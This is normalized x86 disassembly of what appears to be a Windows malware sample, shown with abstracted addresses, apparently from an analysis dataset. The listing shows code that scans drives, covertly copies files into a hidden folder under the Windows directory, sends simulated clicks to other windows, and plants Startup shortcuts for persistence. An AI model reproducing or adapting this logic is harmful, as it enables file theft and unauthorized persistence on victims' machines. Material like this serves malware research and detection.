push ebx
mov eax ecx
mov esi edi
mov edi [ esp + 0x14 ]
mov [ esp + 0x1c ] edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
add ebp edx
and ecx 0x3
[ edi ] [ esi ]
call [ GetDriveTypeA@IAT ]
cmp eax 0x2
mov [ esp + 0x10 ] eax
je r-xdata
pop ebx
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + ebp + 0x9c ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
[ edi ]
not ecx
mov eax [ esp + 0x14 ]
dec ecx
lea ebp [ ecx + ebp + 0x1 ]
mov ecx [ esp + 0x10 ]
mov [ esp + ebp + 0x9c ] ecx
mov ecx [ esp + 0x18 ]
add eax ecx
add ebp 0x4
mov [ esp + 0x14 ] eax
lea ebx [ esp + eax + 0x29c ]
mov al [ esp + eax + 0x29c ]
test al al
jne r-xdata
sub_4037a0
mov ecx [ rw-data ]
mov eax [ rw-data ]
sub esp 0x210
mov edx ecx
shr ecx 0x2
push ebx
push ebp
push esi
push edi
mov esi eax
lea edi [ esp + 0x20 ]
[ edi ] [ esi ]
mov ecx edx
push 0x5c
and ecx 0x3
push eax
[ edi ] [ esi ]
mov esi [ strrchr@IAT ]
call esi
push eax
call sub_403a70
lea eax [ esp + 0x2c ]
push 0x5c
push eax
call esi
add esp 0x14
test eax eax
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x20 ]
[ edi ]
not ecx
sub edi ecx
push 0x7d00
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
mov [ esp + 0x1c ] 0x42
and ecx 0x3
[ edi ] [ esi ]
call [ malloc@IAT ]
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
mov [ eax + 0x1 ] 0x0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x210
retn
lea eax [ esp + 0x20 ]
push eax
call sub_4039f0
mov esi eax
add esp 0x4
cmp esi 0xffffffff
je r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
test esi esi
jne r-xdata
lea ecx [ esi + esi * 4 ]
lea edx [ esp + 0x18 ]
shl ecx 0x6
add ecx 0x5
push 0x5
push edx
mov [ esp + 0x21 ] ecx
call sub_402120
add esp 0x8
lea eax [ esp + 0x20 ]
push ebx
push eax
call [ FindFirstFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
mov esi 0x1
push ebx
call sub_403ad0
add esp 0x4
test eax eax
je r-xdata
or ecx eax
mov edi rw-data
xor eax eax
lea edx [ ebx + 0x2c ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x10 ]
push ecx
push ebx
push 0x140
push ebx
call sub_402b40
push 0x140
push ebx
call sub_402080
push ebx
call [ free@IAT ]
add esp 0x1c
pop edi
pop esi
pop ebp
pop ebx
add esp 0x210
retn
xor ebp ebp
dec esi
test esi esi
mov [ esp + 0x10 ] esi
jle r-xdata
lea edx [ esp + 0x14 ]
push edx
push ebx
push 0x140
push ebx
call sub_402b40
push 0x140
push ebx
call sub_402080
add esp 0x18
test eax eax
je r-xdata
push edi
call [ FindClose@IAT ]
push ebx
push edi
call sub_403990
add esp 0x8
cmp eax 0xffffffff
je r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
push edi
call [ FindClose@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x210
retn
add ebp eax
lea esi [ eax + eax * 4 ]
lea eax [ esp + 0x14 ]
shl esi 0x6
push eax
push ebx
push esi
push ebx
call sub_402b40
push esi
push ebx
call sub_402080
add esp 0x18
test eax eax
je r-xdata
cmp ebp [ esp + 0x10 ]
jl r-xdata
sub_403990
push ebx
mov ebx [ esp + 0x8 ]
push ebp
mov ebp [ FindNextFileA@IAT ]
push esi
mov esi [ esp + 0x14 ]
push edi
push esi
push ebx
xor edi edi
call ebp
test eax eax
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ rw-data ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
push esi
call sub_403ad0
add esp 0x4
test eax eax
je r-xdata
cmp edi 0x64
jge r-xdata
inc edi
add esi 0x140
push esi
push ebx
call ebp
test eax eax
jne r-xdata
sub_4039f0
mov ecx [ esp + 0x4 ]
sub esp 0x140
lea eax [ esp ]
push ebx
push esi
push edi
push eax
push ecx
xor edi edi
call [ FindFirstFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
add esp 0x140
retn
mov ebx [ FindNextFileA@IAT ]
mov eax [ rw-data ]
test eax eax
jne r-xdata
inc edi
push esi
call [ FindClose@IAT ]
pop edi
pop esi
or eax 0xffffffff
pop ebx
add esp 0x140
retn
lea eax [ esp + 0xc ]
push eax
push esi
call ebx
test eax eax
je r-xdata
push esi
call [ FindClose@IAT ]
jmp r-xdata
lea edx [ esp + 0xc ]
push edx
call sub_403ad0
add esp 0x4
test eax eax
je r-xdata
sub_403a70
mov edx [ esp + 0x4 ]
mov [ rw-data ] 0x0
test edx edx
je r-xdata
retn
push ebx
mov ebx [ strchr@IAT ]
push esi
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ecx 0x2
jb r-xdata
mov [ edx ] 0x0
test edx edx
jne r-xdata
mov eax [ rw-data ]
mov [ eax * 4 + rw-data ] esi
inc eax
mov [ rw-data ] eax
lea esi [ edx + 0x1 ]
push 0x3b
push esi
call ebx
mov edx eax
add esp 0x8
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
sub_403ad0
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
mov cl [ eax ]
push edi
test cl 0x10
je r-xdata
add eax 0x2c
push 0x2e
push eax
call [ strrchr@IAT ]
mov ebx eax
mov eax [ rw-data ]
add esp 0x8
xor ebp ebp
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov edi [ lstrcmpiA@IAT ]
mov esi rw-data
test ebx ebx
je r-xdata
mov eax [ esi ]
push rw-data
push eax
call edi
test eax eax
je r-xdata
mov ecx [ esi ]
lea edx [ ebx + 0x1 ]
add ecx 0x2
push ecx
push edx
call edi
test eax eax
je r-xdata
mov eax [ rw-data ]
inc ebp
add esi 0x4
cmp ebp eax
jl r-xdata
jmp r-xdata
mov eax [ esi ]
push rw-data
push eax
call edi
test eax eax
je r-xdata
sub_403b90
mov eax [ rw-data ]
sub esp 0x104
test eax eax
push ebx
push esi
push edi
jne r-xdata
push rw-data
push rw-data
call [ fopen@IAT ]
mov edi eax
add esp 0x8
test edi edi
jne r-xdata
mov eax [ rw-data ]
or ecx 0xffffffff
mov [ rw-data ] 0x1
lea edx [ eax + 0x4 ]
xor eax eax
mov edi edx
[ edi ]
not ecx
dec ecx
mov ebx ecx
cmp ebx 0x114
jae r-xdata
mov esi [ rw-data ]
mov eax [ rw-data ]
push eax
call [ fclose@IAT ]
add esp 0x4
mov [ rw-data ] 0x45
call sub_403b60
pop edi
pop esi
pop ebx
add esp 0x104
retn
pop edi
pop esi
pop ebx
add esp 0x104
retn
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax [ rw-data ]
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
cmp eax 0x56
[ edi ] [ esi ]
jne r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x4f
call sub_403b60
cmp [ rw-data ] 0x56
jne r-xdata
push 0x0
push rw-data
call [ SetFileAttributesA@IAT ]
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
lea eax [ esp + 0x10 ]
push 0x100
push eax
call [ GetWindowsDirectoryA@IAT ]
or ecx 0xffffffff
mov edi rw-data
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x10 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
push rw-data
call sub_403da0
add esp 0x4
push rw-data
push rw-data
jmp r-xdata
mov eax [ rw-data ]
mov edx [ rw-data ]
sub eax ebx
lea esi [ edx + ebx + 0x5 ]
sub eax 0x5
jmp r-xdata
mov [ rw-data ] 0x45
call sub_403b60
pop edi
pop esi
pop ebx
add esp 0x104
retn
push rw-data
call [ fopen@IAT ]
mov edi eax
add esp 0x8
test edi edi
jne r-xdata
lea ecx [ esp + 0xc ]
mov [ esp + 0xc ] eax
push ecx
push esi
push eax
push esi
call sub_402b40
mov edx [ esp + 0x1c ]
push edi
push edx
push 0x1
push esi
call [ fwrite@IAT ]
push edi
call [ fclose@IAT ]
mov eax [ rw-data ]
add esp 0x24
test eax eax
je r-xdata
sub_403da0
sub esp 0x254
push ebp
mov ebp [ esp + 0x25c ]
push esi
push edi
push rw-data
push ebp
call [ strstr@IAT ]
add esp 0x8
test eax eax
jne r-xdata
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x1c ]
lea edx [ esp + 0x1c ]
[ edi ]
lea ecx [ esp + 0xc ]
mov [ esp + 0x48 ] 0x1
push ecx
push edx
push eax
push eax
push eax
push eax
push eax
push eax
push ebp
push eax
mov [ esp + 0x74 ] ax
call [ CreateProcessA@IAT ]
pop edi
pop esi
pop ebp
add esp 0x254
retn
mov edi ebp
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x60 ]
mov eax ecx
mov esi edi
mov edi edx
push 0x22
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov esi [ strchr@IAT ]
lea ecx [ esp + 0x64 ]
push ecx
call esi
add esp 0x8
test eax eax
je r-xdata
inc eax
push 0x22
push eax
call esi
add esp 0x8
test eax eax
je r-xdata
lea edx [ esp + 0x60 ]
push 0x5c
push edx
mov [ eax ] 0x0
call [ strrchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
cmp [ eax - 0x1 ] 0x3a
jne r-xdata
mov [ eax ] 0x0
mov [ eax + 0x1 ] 0x0
jmp r-xdata
lea eax [ esp + 0x61 ]
push eax
call [ SetCurrentDirectoryA@IAT ]
sub_403e80
sub esp 0x408
mov [ rw-data ] 0x4f
push edi
call sub_403b60
mov edx [ rw-data ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
cmp [ edx + ecx - 0x2 ] 0x3a
jne r-xdata
push ebx
push esi
lea eax [ esp + 0xc ]
push 0x200
push eax
call [ GetWindowsDirectoryA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc ]
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ CreateDirectoryA@IAT ]
lea ecx [ esp + 0xc ]
push ecx
call [ GetFileAttributesA@IAT ]
or al 0x2
lea edx [ esp + 0xc ]
push eax
push edx
call [ SetFileAttributesA@IAT ]
mov edx [ rw-data ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
mov [ ecx + edx - 0x1 ] al
mov eax [ rw-data ]
push eax
lea ecx [ esp + 0x210 ]
push rw-data
push ecx
call [ wsprintfW@IAT ]
lea edx [ esp + 0x18 ]
lea eax [ esp + 0x218 ]
push edx
push eax
call sub_403f70
add esp 0x14
pop esi
pop ebx
cmp [ edx + ecx - 0x1 ] 0x5c
je r-xdata
pop edi
add esp 0x408
retn
sub_403f70
mov eax 0x126c
call sub_405ed0
mov eax [ rw-data ]
push ebx
push ebp
push esi
test eax eax
push edi
je r-xdata
mov ebx [ esp + 0x1280 ]
mov esi [ wsprintfW@IAT ]
push ebx
lea eax [ esp + 0xa78 ]
push rw-data
push eax
call esi
add esp 0xc
lea ecx [ esp + 0x124 ]
lea edx [ esp + 0xa74 ]
push ecx
push edx
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
mov [ esp + 0x10 ] eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x126c
retn
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x126c
retn
mov ebp [ esp + 0x1284 ]
push edi
call [ FindClose@IAT ]
cmp [ esp + 0x150 ] 0x2e
je r-xdata
mov edi [ esp + 0x10 ]
lea eax [ esp + 0x124 ]
push eax
push edi
call [ FindNextFileW@IAT ]
test eax eax
je r-xdata
lea ecx [ esp + 0x150 ]
lea edx [ esp + 0x374 ]
push ecx
push edx
call [ wcscpy@IAT ]
mov al [ esp + 0x12c ]
add esp 0x8
test al 0x10
je r-xdata
lea ecx [ esp + 0x14 ]
push ecx
call [ GetLocalTime@IAT ]
mov eax [ esp + 0x1e ]
mov edx [ rw-data ]
mov ecx [ esp + 0x1c ]
and eax 0xffff
push edx
mov edx [ esp + 0x1e ]
push eax
mov eax [ esp + 0x1e ]
and ecx 0xffff
and edx 0xffff
push ecx
and eax 0xffff
push edx
push eax
lea ecx [ esp + 0x688 ]
push rw-data
push ecx
call esi
mov eax [ rw-data ]
add esp 0x1c
mov edx eax
inc eax
cmp edx 0x1869f
mov [ rw-data ] eax
jle r-xdata
mov eax [ rw-data ]
mov edi [ sprintf@IAT ]
push eax
lea ecx [ esp + 0x578 ]
push rw-data
push ecx
call edi
mov eax [ rw-data ]
add esp 0xc
mov edx eax
inc eax
cmp edx 0x1869f
mov [ rw-data ] eax
jle r-xdata
lea eax [ esp + 0x374 ]
push 0x2e
push eax
call [ wcsrchr@IAT ]
lea ecx [ esp + 0x37c ]
lea edx [ esp + 0xc84 ]
push ecx
push ebx
push rw-data
push edx
mov edi eax
call esi
add esp 0x18
test edi edi
jne r-xdata
mov [ rw-data ] 0x0
lea eax [ esp + 0x374 ]
lea ecx [ esp + 0xe7c ]
push eax
push ebx
push rw-data
push ecx
call esi
lea edx [ esp + 0x584 ]
lea eax [ esp + 0x34 ]
push edx
push ebp
push rw-data
push eax
call edi
add esp 0x20
lea ecx [ esp + 0x24 ]
push 0x0
push ecx
call [ CreateDirectoryA@IAT ]
lea edx [ esp + 0x24 ]
lea eax [ esp + 0xe7c ]
push edx
push eax
call sub_403f70
add esp 0x8
test eax eax
je r-xdata
mov [ rw-data ] 0x0
add edi 0x2
lea edx [ esp + 0x674 ]
push edi
push edx
push ebp
lea eax [ esp + 0x880 ]
push rw-data
push eax
call esi
add esp 0x14
lea eax [ esp + 0x674 ]
lea ecx [ esp + 0x874 ]
push eax
push ebp
push rw-data
push ecx
call esi
add esp 0x10
jmp r-xdata
mov eax [ esp + 0x10 ]
push eax
call [ FindClose@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x126c
retn
jmp r-xdata
lea ecx [ esp + 0x874 ]
push 0x0
lea edx [ esp + 0xc80 ]
push ecx
push edx
call [ CopyFileW@IAT ]
jmp r-xdata
sub_4041f0
mov eax [ rw-data ]
test eax eax
jne r-xdata
xor eax eax
retn 0x4
push ebx
mov ebx [ Sleep@IAT ]
push esi
mov esi [ GetWindow@IAT ]
push edi
mov edi [ GetForegroundWindow@IAT ]
push 0x0
call edi
push eax
call esi
push eax
call sub_404240
add esp 0x4
push 0xa
call ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn 0x4
sub_404240
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push edi
mov edi [ GetWindow@IAT ]
push 0x5
push esi
call edi
push eax
call sub_404240
add esp 0x4
push 0x2
push esi
call edi
mov esi eax
test esi esi
jne r-xdata
push esi
call sub_404500
add esp 0x4
push esi
call sub_404290
add esp 0x4
test eax eax
je r-xdata
pop edi
sub_404290
sub esp 0x500
mov al [ rw-data ]
push ebx
push ebp
push esi
push edi
mov [ esp + 0x10 ] al
mov ecx 0x1f
xor eax eax
lea edi [ esp + 0x11 ]
mov ebp [ esp + 0x514 ]
[ edi ]
stosw [ edi ]
lea ecx [ esp + 0x10 ]
push 0x80
push ecx
push ebp
stosb [ edi ]
call [ GetClassNameA@IAT ]
mov ebx [ GetWindowTextA@IAT ]
xor edi edi
mov [ rw-data ] edi
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
inc edi
cmp edi 0x23
mov [ rw-data ] edi
jge r-xdata
mov al [ rw-data ]
mov ecx 0x7f
mov [ esp + 0x90 ] al
xor eax eax
lea edi [ esp + 0x91 ]
push 0x200
[ edi ]
stosw [ edi ]
lea ecx [ esp + 0x94 ]
push ecx
push ebp
stosb [ edi ]
call ebx
mov edi [ rw-data ]
mov edx edi
shl edx 0x6
add edx edi
lea eax [ edi + edx * 2 ]
shl eax 0x2
mov ecx [ eax + rw-data ]
test ecx ecx
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x500
retn
jmp r-xdata
mov ecx edi
shl ecx 0x6
add ecx edi
lea edx [ edi + ecx * 2 ]
mov eax [ edx * 4 + rw-data ]
test eax eax
je r-xdata
mov ecx [ eax + rw-data ]
test ecx ecx
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov edx edi
shl edx 0x6
add edx edi
lea eax [ edi + edx * 2 ]
lea esi [ eax * 4 + rw-data ]
lea eax [ esp + 0x10 ]
push rw-data
push ebp
call [ GetWindowRect@IAT ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push ecx
push edx
lea ecx [ esp + 0xa0 ]
push eax
mov eax [ rw-data ]
lea edx [ esp + 0x24 ]
push ecx
push edx
push ebp
push eax
lea ecx [ esp + 0x2b4 ]
push rw-data
push ecx
call [ sprintf@IAT ]
mov eax 0xa
add esp 0x2c
mov [ rw-data ] eax
mov [ rw-data ] eax
mov esi rw-data
lea eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x500
retn
lea edx [ eax + rw-data ]
lea eax [ esp + 0x90 ]
push edx
push eax
call [ strstr@IAT ]
mov edi [ rw-data ]
add esp 0x8
lea esi [ eax + rw-data ]
lea eax [ esp + 0x90 ]
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
sbb eax eax
sbb eax 0xffffffff
xor ecx ecx
test eax eax
sete cl
mov eax ecx
jmp r-xdata
test cl cl
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x500
retn
mov eax [ rw-data ]
mov edx [ rw-data ]
sub eax edx
cmp eax 0x12c
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
test eax eax
jne r-xdata
xor eax eax
xor ecx ecx
test eax eax
sete cl
mov eax ecx
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov [ rw-data ] 0xb5
mov [ rw-data ] 0x35
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_404500
mov eax [ rw-data ]
push esi
mov ecx eax
shl ecx 0x6
add ecx eax
lea edx [ eax + ecx * 2 ]
mov eax [ edx * 4 + rw-data ]
test eax eax
je r-xdata
push ebx
call sub_4045b0
mov eax [ rw-data ]
mov esi rw-data
mov ecx eax
shl ecx 0x6
add ecx eax
lea edx [ eax + ecx * 2 ]
lea eax [ edx * 4 + rw-data ]
mov esi [ esp + 0x8 ]
push edi
mov edi [ SendMessageA@IAT ]
push 0xa0005
push 0x0
push 0x201
push esi
call edi
push 0xa0005
push 0x0
push 0x202
push esi
call edi
pop edi
pop esi
retn
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
pop esi
retn
sub [ rw-data ] 0x14
call sub_4045b0
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
test eax eax
pop ebx
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_4045b0
push ebx
push ebp
push esi
push edi
mov edi [ GetSystemMetrics@IAT ]
push 0x0
call edi
mov ecx eax
mov eax 0xffff
cdq
dec ecx
push 0x1
idiv ecx
mov esi eax
call edi
mov ecx eax
mov eax 0xffff
cdq
dec ecx
mov ebp [ rw-data ]
idiv ecx
mov edx [ rw-data ]
push 0x0
sub edx ebp
push 0x0
mov ebx [ mouse_event@IAT ]
mov edi eax
mov eax [ rw-data ]
imul edx edi
push edx
mov edx [ rw-data ]
sub eax edx
imul eax esi
push eax
push 0x8001
call ebx
mov ebp [ Sleep@IAT ]
push 0x28
call ebp
mov ecx [ rw-data ]
mov eax [ rw-data ]
sub ecx eax
mov edx [ rw-data ]
imul ecx edi
push 0x0
push 0x0
push ecx
mov ecx [ rw-data ]
sub edx ecx
imul edx esi
push edx
push 0x8002
call ebx
push 0x28
call ebp
mov eax [ rw-data ]
mov ecx [ rw-data ]
sub eax ecx
mov ecx [ rw-data ]
imul eax edi
mov edi [ rw-data ]
push 0x0
sub ecx edi
push 0x0
imul ecx esi
push eax
push ecx
push 0x8004
call ebx
pop edi
pop esi
pop ebp
pop ebx
retn
sub_404680
sub esp 0x104
lea eax [ esp ]
push 0x0
push 0x18
push eax
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
test eax eax
je r-xdata
add esp 0x104
retn
push ebx
push esi
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0xc ]
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0xc ]
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x114 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0xc ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ DeleteFileA@IAT ]
pop edi
pop esi
pop ebx
sub_404710
sub esp 0x314
lea eax [ esp + 0x8 ]
push 0x0
push 0x7
push eax
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
test eax eax
je r-xdata
add esp 0x314
retn
push ebx
push esi
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x14 ]
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0x14 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
mov edi [ esp + 0x328 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x18 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ _access@IAT ]
add esp 0x8
test eax eax
pop edi
pop esi
pop ebx
jne r-xdata
push 0x0
call [ CoInitialize@IAT ]
lea ecx [ esp ]
push ecx
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
jl r-xdata
mov eax [ esp + 0x324 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov ecx [ esp + 0x320 ]
push ecx
push eax
mov edx [ eax ]
call [ edx + 0x50 ]
mov eax [ esp ]
mov ecx [ esp + 0x31c ]
push ecx
push eax
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ esp ]
lea ecx [ esp + 0x4 ]
push ecx
push r--data
mov edx [ eax ]
push eax
call [ edx ]
test eax eax
jl r-xdata
mov eax [ esp ]
push eax
mov edx [ eax ]
call [ edx + 0x8 ]
lea edx [ esp + 0x10c ]
push 0x104
push edx
lea eax [ esp + 0x10 ]
push 0xffffffff
push eax
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
mov eax [ esp + 0x4 ]
lea edx [ esp + 0x10c ]
push 0x1
push edx
mov ecx [ eax ]
push eax
call [ ecx + 0x18 ]
mov eax [ esp + 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_404870
sub esp 0x410
mov eax rw-data
push ebx
push esi
push edi
mov esi rw-data
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
lea eax [ esp + 0x214 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
push 0x0
lea ecx [ esp + 0x114 ]
push 0x2
push ecx
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
test eax eax
je r-xdata
push rw-data
call sub_404680
add esp 0x4
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x410
retn
lea edi [ esp + 0x110 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0xc ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
lea eax [ esp + 0x110 ]
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x424 ]
mov edi [ esp + 0x420 ]
push ecx
push edi
push edx
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0x14
lea ecx [ esp + 0x214 ]
lea edx [ esp + 0x110 ]
push ecx
push edx
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
push ebp
lea ecx [ esp + 0x114 ]
push 0x1
push ecx
push rw-data
push rw-data
call sub_404710
or ecx 0xffffffff
xor eax eax
add esp 0x10
lea edx [ esp + 0x31c ]
[ edi ]
not ecx
sub edi ecx
lea ebp [ esp + 0x31c ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
push eax
lea eax [ esp + 0x114 ]
push eax
push rw-data
push rw-data
call sub_404710
add esp 0x10
pop edi
pop esi
pop ebx
add esp 0x410
retn
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x14 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi ebp
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x14 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ CreateDirectoryA@IAT ]
test ebx ebx
je r-xdata
mov [ ebx ] 0x0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0x14 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x42c ]
